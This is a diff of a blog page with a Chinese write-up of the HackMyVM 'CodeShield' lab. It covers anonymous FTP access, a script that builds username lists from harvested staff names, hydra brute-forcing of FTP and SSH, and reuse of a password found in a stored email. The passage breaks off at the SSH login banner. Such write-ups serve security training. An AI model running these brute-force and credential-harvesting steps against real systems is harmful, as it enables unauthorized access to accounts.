@@ -96,7 +96,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
 <meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_CodeShield.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>hmv_CodeShield</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -195,7 +195,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
 <p>先把我们感兴趣的端口挑出来<code class="notranslate">21、80、443、22222</code>，现在就这几个，后面没有头绪再挑</p>
 <h1>2.踩点</h1>
 <p>我比较喜欢先看ftp21端口。先尝试匿名登录（用户名和密码都是<strong>anonymous</strong>）</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ ftp 192.168.205.138
 Connected to 192.168.205.138.
 220 (vsFTPd 3.0.5)
@@ -203,46 +203,48 @@ Name (192.168.205.138:kali): anonymous
 331 Please specify the password.
 Password: 
 230 Login successful.
-Remote system <span class="pl-c1">type</span> is UNIX.
+Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp<span class="pl-k">&gt;</span> ls -la
-229 Entering Extended Passive Mode (<span class="pl-k">|||</span>5258<span class="pl-k">|</span>)
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||5258|)
 150 Here comes the directory listing.
-drwxr-xr-x    2 0        137          4096 Aug 30  2023 <span class="pl-c1">.</span>
+drwxr-xr-x    2 0        137          4096 Aug 30  2023 .
 drwxr-xr-x    2 0        137          4096 Aug 30  2023 ..
 -rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
 -rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
 -rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
 226 Directory send OK.
-ftp<span class="pl-k">&gt;</span> mget <span class="pl-k">*</span>
-mget CodeShield_pitch_deck.pdf [anpqy<span class="pl-k">?</span>]<span class="pl-k">?</span> y
-229 Entering Extended Passive Mode (<span class="pl-k">|||</span>47152<span class="pl-k">|</span>)
-150 Opening BINARY mode data connection <span class="pl-k">for</span> CodeShield_pitch_deck.pdf (2349914 bytes).
-100% <span class="pl-k">|</span><span class="pl-k">******************************************************************************************</span><span class="pl-k">|</span>  2294 KiB   76.68 MiB/s    00:00 ETA
+ftp&gt; mget *
+mget CodeShield_pitch_deck.pdf [anpqy?]? y
+229 Entering Extended Passive Mode (|||47152|)
+150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).
+100% |******************************************************************************************|  2294 KiB   76.68 MiB/s    00:00 ETA
 226 Transfer complete.
-2349914 bytes received <span class="pl-k">in</span> 00:00 (75.26 MiB/s)
-mget Information_Security_Policy.pdf [anpqy<span class="pl-k">?</span>]<span class="pl-k">?</span> y
-229 Entering Extended Passive Mode (<span class="pl-k">|||</span>40453<span class="pl-k">|</span>)
-150 Opening BINARY mode data connection <span class="pl-k">for</span> Information_Security_Policy.pdf (67520 bytes).
-100% <span class="pl-k">|</span><span class="pl-k">******************************************************************************************</span><span class="pl-k">|</span> 67520       38.67 MiB/s    00:00 ETA
+2349914 bytes received in 00:00 (75.26 MiB/s)
+mget Information_Security_Policy.pdf [anpqy?]? y
+229 Entering Extended Passive Mode (|||40453|)
+150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
+100% |******************************************************************************************| 67520       38.67 MiB/s    00:00 ETA
 226 Transfer complete.
-67520 bytes received <span class="pl-k">in</span> 00:00 (30.61 MiB/s)
-mget The_2023_weak_password_report.pdf [anpqy<span class="pl-k">?</span>]<span class="pl-k">?</span> y
-229 Entering Extended Passive Mode (<span class="pl-k">|||</span>49281<span class="pl-k">|</span>)
-150 Opening BINARY mode data connection <span class="pl-k">for</span> The_2023_weak_password_report.pdf (226435 bytes).
-100% <span class="pl-k">|</span><span class="pl-k">******************************************************************************************</span><span class="pl-k">|</span>   221 KiB   17.71 MiB/s    00:00 ETA
+67520 bytes received in 00:00 (30.61 MiB/s)
+mget The_2023_weak_password_report.pdf [anpqy?]? y
+229 Entering Extended Passive Mode (|||49281|)
+150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
+100% |******************************************************************************************|   221 KiB   17.71 MiB/s    00:00 ETA
 226 Transfer complete.
-226435 bytes received <span class="pl-k">in</span> 00:00 (16.96 MiB/s)
-</pre></div>
+226435 bytes received in 00:00 (16.96 MiB/s)
+
+</code></pre>
 <p>去文件管理器查看一下这三个pdf文件</p>
 <ol>
 <li>
 <p>CodeShield_pitch_deck.pdf</p>
 <p>在末尾发行人名、邮箱、电话等信息，我们收集起来用于后续的爆破</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">Jessica Carlson
+<pre lang="bash" class="notranslate"><code class="notranslate">Jessica Carlson
 j.carlson@codeshield.hmv
 206-555-0146
-CodeShield</pre></div>
+CodeShield
+</code></pre>
 </li>
 <li>
 <p>Information_Security_Policy.pdf</p>
@@ -251,16 +253,17 @@ CodeShield</pre></div>
 <li>
 <p>The_2023_weak_password_report.pdf</p>
 <p>有一个密码本，我们也收集一下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">Xxxxxxxxx001
-Password123<span class="pl-k">!</span>
-Greatplace2work<span class="pl-k">!</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">Xxxxxxxxx001
+Password123!
+Greatplace2work!
 Diciembre@2017
-Hairdresser1<span class="pl-k">!</span>
+Hairdresser1!
 1qa2ws3ed4rf
 XXXX12345678
 Hairdresser1
 Xxxxxxxxx002
-Xxxxxxxxxx01</pre></div>
+Xxxxxxxxxx01
+</code></pre>
 </li>
 </ol>
 <p>ftp服务的踩点到此告一段落，接着我们去看看80端口。</p>
@@ -269,7 +272,7 @@ Xxxxxxxxxx01</pre></div>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9e82acfd-4587-4d74-9955-4dfdf6f5347a"><img src="https://github.com/user-attachments/assets/9e82acfd-4587-4d74-9955-4dfdf6f5347a" alt="Image" style="max-width: 100%;"></a></p>
 <p>将上面的人名加入我们的<strong>user</strong>中，需要注意的是它在<strong>正文也隐藏了一个人名</strong></p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2b3da8c1-a942-450f-9098-9d6c70ca519d"><img src="https://github.com/user-attachments/assets/2b3da8c1-a942-450f-9098-9d6c70ca519d" alt="Image" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">Angelina Johnson
+<pre lang="bash" class="notranslate"><code class="notranslate">Angelina Johnson
 Jennifer Cruise
 John Doe
 Bob Watson
@@ -277,60 +280,61 @@ Mohammed Mansour
 Xian Tan
 Thomas Mitchell
 Patrick Early
-Kevin Valdez</pre></div>
+Kevin Valdez
+</code></pre>
 <p>浅浅扫一下漏洞和目录</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4857fc94-ca7c-45ad-911f-6e563f437263"><img src="https://github.com/user-attachments/assets/4857fc94-ca7c-45ad-911f-6e563f437263" alt="Image" style="max-width: 100%;"></a></p>
 <p>发现了一个<code class="notranslate">mail</code>，但是这个我记得没有洞，倒是可以爆破，后面再试。目前来看应该是爆破ssh服务，但是我们目前收集的用户名是无法直接使用的，需要进行转换</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ cat user.py  
 import sys
 
 def generate_usernames(names):
     usernames = []
 
-    <span class="pl-k">for</span> <span class="pl-smi">name</span> <span class="pl-k">in</span> names:
-        parts = <span class="pl-en">name.split</span>()
-        <span class="pl-k">if</span> len(parts) <span class="pl-k">&lt;</span> 2:
-            print(f<span class="pl-s"><span class="pl-pds">"</span>Skipping invalid name: {name}<span class="pl-pds">"</span></span>)
-            <span class="pl-k">continue</span>  <span class="pl-c"><span class="pl-c">#</span> 如果名字不符合格式（没有姓氏），则跳过这一行</span>
+    for name in names:
+        parts = name.split()
+        if len(parts) &lt; 2:
+            print(f"Skipping invalid name: {name}")
+            continue  # 如果名字不符合格式（没有姓氏），则跳过这一行
       
-        <span class="pl-en">usernames.append(parts[0][0].lower</span>() + <span class="pl-en">parts[1].lower</span>())  <span class="pl-c"><span class="pl-c">#</span> 姓名缩写 + 姓氏</span>
-        <span class="pl-en">usernames.append(parts[0].lower</span>() + <span class="pl-en">parts[1].lower</span>())  <span class="pl-c"><span class="pl-c">#</span> 全名</span>
-        <span class="pl-en">usernames.append(parts[1].lower</span>() + <span class="pl-en">parts[0][0].lower</span>())  <span class="pl-c"><span class="pl-c">#</span> 姓氏 + 姓名首字母</span>
-        <span class="pl-en">usernames.append(parts[0].lower</span>())  <span class="pl-c"><span class="pl-c">#</span> 只用名字</span>
-        <span class="pl-en">usernames.append(parts[1].lower</span>())  <span class="pl-c"><span class="pl-c">#</span> 只用姓氏</span>
+        usernames.append(parts[0][0].lower() + parts[1].lower())  # 姓名缩写 + 姓氏
+        usernames.append(parts[0].lower() + parts[1].lower())  # 全名
+        usernames.append(parts[1].lower() + parts[0][0].lower())  # 姓氏 + 姓名首字母
+        usernames.append(parts[0].lower())  # 只用名字
+        usernames.append(parts[1].lower())  # 只用姓氏
 
-        <span class="pl-en">usernames.append(parts[0][0].lower</span>() + <span class="pl-s"><span class="pl-pds">'</span>.<span class="pl-pds">'</span></span> + <span class="pl-en">parts[1].lower</span>())  <span class="pl-c"><span class="pl-c">#</span> "j.carlson"</span>
+        usernames.append(parts[0][0].lower() + '.' + parts[1].lower())  # "j.carlson"
 
-    <span class="pl-k">return</span> usernames
+    return usernames
 
 def read_names_from_file(file_path):
-    with open(file_path, <span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>) as f:
-        names = <span class="pl-en">f.readlines</span>()
-    <span class="pl-c"><span class="pl-c">#</span> 去除每行末尾的换行符</span>
-    <span class="pl-k">return</span> [name.strip() <span class="pl-k">for</span> <span class="pl-smi">name</span> <span class="pl-k">in</span> names]
+    with open(file_path, 'r') as f:
+        names = f.readlines()
+    # 去除每行末尾的换行符
+    return [name.strip() for name in names]
 
-def <span class="pl-en">main</span>():
-    <span class="pl-k">if</span> len(sys.argv) <span class="pl-k">!</span>= 2:
-        print(<span class="pl-s"><span class="pl-pds">"</span>Usage: python3 a.py &lt;filename&gt;<span class="pl-pds">"</span></span>)
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 a.py &lt;filename&gt;")
         sys.exit(1)
 
-    <span class="pl-c"><span class="pl-c">#</span> 从命令行参数获取文件路径</span>
+    # 从命令行参数获取文件路径
     file_path = sys.argv[1]
     try:
-        <span class="pl-c"><span class="pl-c">#</span> 读取文件中的名字</span>
+        # 读取文件中的名字
         names = read_names_from_file(file_path)
-        <span class="pl-c"><span class="pl-c">#</span> 生成用户名列表</span>
+        # 生成用户名列表
         usernames = generate_usernames(names)
-        <span class="pl-c"><span class="pl-c">#</span> 打印生成的用户名</span>
-        <span class="pl-k">for</span> <span class="pl-smi">username</span> <span class="pl-k">in</span> usernames:
+        # 打印生成的用户名
+        for username in usernames:
             print(username)
     except FileNotFoundError:
-        print(f<span class="pl-s"><span class="pl-pds">"</span>Error: The file {file_path} was not found.<span class="pl-pds">"</span></span>)
+        print(f"Error: The file {file_path} was not found.")
         sys.exit(1)
 
-<span class="pl-k">if</span> __name__ == <span class="pl-s"><span class="pl-pds">"</span>__main__<span class="pl-pds">"</span></span>:
-    <span class="pl-en">main</span>()
+if __name__ == "__main__":
+    main()
 
 ┌──(kali㉿kali)-[~/test/tmp]
 └─$ cat user   
@@ -346,7 +350,7 @@ Kevin Valdez
 j.carlson
 
 ┌──(kali㉿kali)-[~/test/tmp]
-└─$ python3 user.py user <span class="pl-k">&gt;&gt;</span> user
+└─$ python3 user.py user &gt;&gt; user
                                                                                                                                     
 ┌──(kali㉿kali)-[~/test/tmp]
 └─$ cat user
@@ -419,41 +423,44 @@ k.valdez
 ┌──(kali㉿kali)-[~/test/tmp]
 └─$ cat pass                        
 Xxxxxxxxx001
-Password123<span class="pl-k">!</span>
-Greatplace2work<span class="pl-k">!</span>
+Password123!
+Greatplace2work!
 Diciembre@2017
-Hairdresser1<span class="pl-k">!</span>
+Hairdresser1!
 1qa2ws3ed4rf
 XXXX12345678
 Hairdresser1
 Xxxxxxxxx002
-Xxxxxxxxxx01</pre></div>
+Xxxxxxxxxx01
+</code></pre>
 <p>先尝试爆破<strong>ssh服务</strong></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ hydra -L user -P pass ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222 
-Hydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:55:19
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), <span class="pl-k">~</span>14 tries per task
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
 [DATA] attacking ssh://192.168.205.138:22222/
-[STATUS] 554.00 tries/min, 554 tries <span class="pl-k">in</span> 00:01h, 333 to <span class="pl-k">do</span> <span class="pl-k">in</span> 00:01h, 22 active
+[STATUS] 554.00 tries/min, 554 tries in 00:01h, 333 to do in 00:01h, 22 active
 1 of 1 target completed, 0 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:56:24</pre></div>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:56:24
+</code></pre>
 <p>无果，再测试爆破<strong>ftp服务</strong></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ hydra -L user -P pass ftp://192.168.205.138 -I -u -f -e nsr -t 64     
-Hydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:56:47
-[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), <span class="pl-k">~</span>14 tries per task
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
 [DATA] attacking ftp://192.168.205.138:21/
-[21][ftp] host: 192.168.205.138   login: valdezk   password: Greatplace2work<span class="pl-k">!</span>
-[STATUS] attack finished <span class="pl-k">for</span> 192.168.205.138 (valid pair found)
+[21][ftp] host: 192.168.205.138   login: valdezk   password: Greatplace2work!
+[STATUS] attack finished for 192.168.205.138 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:57:11</pre></div>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:57:11
+</code></pre>
 <p>爆破出一组用户和密码，我们进去看看有啥</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ ftp 192.168.205.138
 Connected to 192.168.205.138.
 220 (vsFTPd 3.0.5)
@@ -461,12 +468,12 @@ Name (192.168.205.138:kali): valdezk
 331 Please specify the password.
 Password: 
 230 Login successful.
-Remote system <span class="pl-c1">type</span> is UNIX.
+Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp<span class="pl-k">&gt;</span> ls -la
-229 Entering Extended Passive Mode (<span class="pl-k">|||</span>18011<span class="pl-k">|</span>)
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||18011|)
 150 Here comes the directory listing.
-drwxr-x---   18 1007     1007         4096 Aug 29  2023 <span class="pl-c1">.</span>
+drwxr-x---   18 1007     1007         4096 Aug 29  2023 .
 drwxr-xr-x   14 0        0            4096 Aug 26  2023 ..
 -rw-------    1 1007     1007           56 Aug 29  2023 .Xauthority
 -rw-rw-r--    1 1007     1007            0 Aug 28  2023 .bash_history
@@ -505,28 +512,30 @@ drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Public
 drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Templates
 drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Videos
 drwx------    3 1007     1007         4096 Aug 28  2023 snap
-drwxrwxr-t    2 1007     1007         4096 Aug 29  2023 thinclient_drives</pre></div>
+drwxrwxr-t    2 1007     1007         4096 Aug 29  2023 thinclient_drives
+</code></pre>
 <p>进来发现我们位于家目录。又到一年一度的找宝藏环节</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ftp<span class="pl-k">&gt;</span> <span class="pl-c1">pwd</span>
-Remote directory: /home/valdezk/.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">ftp&gt; pwd
+Remote directory: /home/valdezk/.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv
+</code></pre>
 <p>在该目录下挖掘到了宝藏😁</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c909abf0-51cf-42b9-9e4b-d7534b6697cc"><img src="https://github.com/user-attachments/assets/c909abf0-51cf-42b9-9e4b-d7534b6697cc" alt="Image" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ cat Trash
 From - Mon Aug 28 18:38:57 2023
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Return-Path: <span class="pl-k">&lt;</span>t.mitchell@codeshield.hmv<span class="pl-k">&gt;</span>
+Return-Path: &lt;t.mitchell@codeshield.hmv&gt;
 Delivered-To: k.valdez@codeshield.hmv
 Received: from mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1])
         by mail.codeshield.hmv (Postfix) with ESMTP id 4RXwV61k4Jz62kW
-        <span class="pl-k">for</span> <span class="pl-k">&lt;</span>k.valdez@codeshield.hmv<span class="pl-k">&gt;</span><span class="pl-k">;</span> Sat, 26 Aug 2023 12:04:30 +0000 (UTC)
-Authentication-Results: mail.codeshield.hmv (amavisd-new)<span class="pl-k">;</span> dkim=pass
-        reason=<span class="pl-s"><span class="pl-pds">"</span>pass (just generated, assumed good)<span class="pl-pds">"</span></span> header.d=codeshield.hmv
-DKIM-Signature: v=1<span class="pl-k">;</span> a=rsa-sha256<span class="pl-k">;</span> c=relaxed/simple<span class="pl-k">;</span> d=codeshield.hmv<span class="pl-k">;</span>
+        for &lt;k.valdez@codeshield.hmv&gt;; Sat, 26 Aug 2023 12:04:30 +0000 (UTC)
+Authentication-Results: mail.codeshield.hmv (amavisd-new); dkim=pass
+        reason="pass (just generated, assumed good)" header.d=codeshield.hmv
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=codeshield.hmv;
          h=content-transfer-encoding:content-type:message-id:user-agent
-        :subject:to:from:date:mime-version<span class="pl-k">;</span> s=dkim<span class="pl-k">;</span> t=1693051468<span class="pl-k">;</span> x=
-        1695643469<span class="pl-k">;</span> bh=9j2IFk0ZpW4pfmvikNYY7hFOEsr+Ze1bR/Ba4zdoUeU=<span class="pl-k">;</span> b=V
+        :subject:to:from:date:mime-version; s=dkim; t=1693051468; x=
+        1695643469; bh=9j2IFk0ZpW4pfmvikNYY7hFOEsr+Ze1bR/Ba4zdoUeU=; b=V
         /krnK4TR1tqxJUcKOs1elfa2D4X6hovoYkOpGBtxQgk2+xA4ADTHUnwNcrG4qRh2
         PG7dbgm+zxZjqfa3x2cdc11BQE9zs4n4D3Hi+aBVUkYFQsQXoWdIpQ7jHntkTSrI
         Mq0tEEuTXmKD/s7YDseYOq1y5kcUaANPYMdVmaf+C/9q2HqEFY5Kzmd+7xlInUIs
@@ -536,136 +545,138 @@ DKIM-Signature: v=1<span class="pl-k">;</span> a=rsa-sha256<span class="pl-k">;<
 X-Virus-Scanned: Debian amavisd-new at mail.codeshield.hmv
 Received: from mail.codeshield.hmv ([127.0.0.1])
         by mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1]) (amavisd-new, port 10026)
-        with ESMTP id kyzCgpKZGZvf <span class="pl-k">for</span> <span class="pl-k">&lt;</span>k.valdez@codeshield.hmv<span class="pl-k">&gt;</span><span class="pl-k">;</span>
+        with ESMTP id kyzCgpKZGZvf for &lt;k.valdez@codeshield.hmv&gt;;
         Sat, 26 Aug 2023 12:04:28 +0000 (UTC)
 Received: from localhost (mail.codeshield.hmv [127.0.0.1])
         by mail.codeshield.hmv (Postfix) with ESMTPSA id 4RXwV43FB8z62kJ
-        <span class="pl-k">for</span> <span class="pl-k">&lt;</span>k.valdez@codeshield.hmv<span class="pl-k">&gt;</span><span class="pl-k">;</span> Sat, 26 Aug 2023 12:04:27 +0000 (UTC)
+        for &lt;k.valdez@codeshield.hmv&gt;; Sat, 26 Aug 2023 12:04:27 +0000 (UTC)
 MIME-Version: 1.0
 Date: Sat, 26 Aug 2023 12:04:26 +0000
 From: t.mitchell@codeshield.hmv
 To: k.valdez@codeshield.hmv
-Subject: Need some <span class="pl-c1">help</span> <span class="pl-k">for</span> data analytics
+Subject: Need some help for data analytics
 User-Agent: Roundcube Webmail
-Message-ID: <span class="pl-k">&lt;</span>7d81f2aca5fd7fb5af8609e03cbe1b3a@codeshield.hmv<span class="pl-k">&gt;</span>
+Message-ID: &lt;7d81f2aca5fd7fb5af8609e03cbe1b3a@codeshield.hmv&gt;
 X-Sender: t.mitchell@codeshield.hmv
-Content-Type: text/plain<span class="pl-k">;</span> charset=US-ASCII<span class="pl-k">;</span>
+Content-Type: text/plain; charset=US-ASCII;
  format=flowed
 Content-Transfer-Encoding: 7bit
 
 Hi Kevin,
 
-Great that you want to <span class="pl-c1">help</span> me with the tooling <span class="pl-k">for</span> data analysis. 
-Patrick has <span class="pl-c1">set</span> some things up, but I can<span class="pl-s"><span class="pl-pds">'</span>t get it to work properly. As </span>
-<span class="pl-s">just discussed during coffee, I will send you my login details to so </span>
-<span class="pl-s">that you can fix it under my account and that I can continue working.</span>
-<span class="pl-s"></span>
-<span class="pl-s">Password: D@taWh1sperer!</span>
-<span class="pl-s"></span>
-<span class="pl-s">Thanks buddy!</span>
-<span class="pl-s"></span>
-<span class="pl-s">Thomas</span>
-<span class="pl-s">                                                </span>
-<span class="pl-s"></span>
-<span class="pl-s">嗨，凯文，</span>
-<span class="pl-s"></span>
-<span class="pl-s">很高兴你想帮助我开发数据分析工具。</span>
-<span class="pl-s">帕特里克已经设置了一些东西，但我无法让它正常工作。正如</span>
-<span class="pl-s">我们喝咖啡时讨论的那样，我会将我的登录详细信息发送给你，</span>
-<span class="pl-s">这样你就可以在</span>
-<span class="pl-s">我的账户下修复它，我就可以继续工作了。</span>
-<span class="pl-s"></span>
-<span class="pl-s">密码：D@taWh1sperer！</span>
-<span class="pl-s"></span>
-<span class="pl-s">谢谢伙计！</span>
-<span class="pl-s"></span>
-<span class="pl-s">托马斯</span></pre></div>
+Great that you want to help me with the tooling for data analysis. 
+Patrick has set some things up, but I can't get it to work properly. As 
+just discussed during coffee, I will send you my login details to so 
+that you can fix it under my account and that I can continue working.
+
+Password: D@taWh1sperer!
+
+Thanks buddy!
+
+Thomas
+                                                
+
+嗨，凯文，
+
+很高兴你想帮助我开发数据分析工具。
+帕特里克已经设置了一些东西，但我无法让它正常工作。正如
+我们喝咖啡时讨论的那样，我会将我的登录详细信息发送给你，
+这样你就可以在
+我的账户下修复它，我就可以继续工作了。
+
+密码：D@taWh1sperer！
+
+谢谢伙计！
+
+托马斯
+</code></pre>
 <p>这个用户应该不是ftp了吧，收收神通吧，请赐予我一个ssh</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
-└─$ hydra -L user -p D@taWh1sperer<span class="pl-k">!</span> ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222
-Hydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ hydra -L user -p D@taWh1sperer! ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 15:15:11
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 64 tasks per 1 server, overall 64 tasks, 260 login tries (l:65/p:4), <span class="pl-k">~</span>5 tries per task
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 260 login tries (l:65/p:4), ~5 tries per task
 [DATA] attacking ssh://192.168.205.138:22222/
-[22222][ssh] host: 192.168.205.138   login: mitchellt   password: D@taWh1sperer<span class="pl-k">!</span>
-[STATUS] attack finished <span class="pl-k">for</span> 192.168.205.138 (valid pair found)
+[22222][ssh] host: 192.168.205.138   login: mitchellt   password: D@taWh1sperer!
+[STATUS] attack finished for 192.168.205.138 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 15:15:18
 
 ┌──(kali㉿kali)-[~/test/tmp]
 └─$ ssh mitchellt@192.168.205.138 -p 22222
-The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>[192.168.205.138]:22222 ([192.168.205.138]:22222)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
-<span class="pl-s">ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.</span>
-<span class="pl-s">This key is not known by any other names.</span>
-<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
-<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>[192.168.205.138]:22222<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
-<span class="pl-s">             @@@                          </span>
-<span class="pl-s">      @@@@@@@@@  @@@@@@                   </span>
-<span class="pl-s"> @@@@@@@@@@@@@@          (@@              </span>
-<span class="pl-s"> @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                 </span>
-<span class="pl-s"> @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗           </span>
-<span class="pl-s">  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║           </span>
-<span class="pl-s">  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║           </span>
-<span class="pl-s">    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝           </span>
-<span class="pl-s">     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝            </span>
-<span class="pl-s">        @@@@@@@   @@@                     </span>
-<span class="pl-s">           @@@@@@@                                                         </span>
-<span class="pl-s"></span>
-<span class="pl-s">  _______________________________________________________________________________________________________</span>
-<span class="pl-s"> |  _WARNING: This system is restricted to authorized users!___________________________________________  |</span>
-<span class="pl-s"> | |                                                                                                   | |</span>
-<span class="pl-s"> | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |</span>
-<span class="pl-s"> | |                                                                                                   | |</span>
-<span class="pl-s"> | | This system is restricted to authorized users.                                                    | | </span>
-<span class="pl-s"> | | Individuals who attempt unauthorized access will be prosecuted.                                   | | </span>
